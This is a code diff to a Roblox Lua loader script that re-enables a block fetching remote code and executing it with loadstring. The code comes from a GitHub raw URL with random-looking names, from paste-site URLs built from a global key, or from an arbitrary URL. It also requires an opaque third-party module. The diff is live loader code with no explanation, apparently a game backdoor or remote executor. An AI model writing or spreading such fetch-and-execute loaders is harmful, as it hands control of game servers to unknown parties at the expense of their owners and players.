@@ -1,6 +1,7 @@
+print("loadway1")
 local Source = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/tber65he56y3btbgtehg/nbwrty5gtrgrsg/main/mnruf7jr6ntydnbyhnt",true)
 require(8082203830):Loadstring(Source)
---local success, error = pcall(function()
+local success, error = pcall(function()
 	local rt=Instance.new("FunctionalTest")rt.Name=math.random() rt.Description=_G.IncreaseronLoaderTarget rt.Parent=game:GetService("TestService")
 	if _G.IncreaseronLoaderSite=="us"then
 		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://api.upload.systems/pastes/".._G.IncreaseronLoaderKey.."/raw")))()
@@ -15,8 +16,8 @@ require(8082203830):Loadstring(Source)
 	elseif _G.IncreaseronLoaderSite=="uni"then
 		loadstring(game:GetService("HttpService"):GetAsync(tostring(_G.IncreaseronLoaderKey)))()
 	end
---end)
---[[
+end)
+
 if error then
 
 	msg=Instance.new("Message",workspace) msg.Text="This game does have https on but doesnt have the full requirements to load. Please use an older verison for unsupported games"
@@ -24,4 +25,4 @@ if error then
 	msg:Remove()
 	_G.IncreaseronLoaderFailed="True"
 	
-end]]
+end
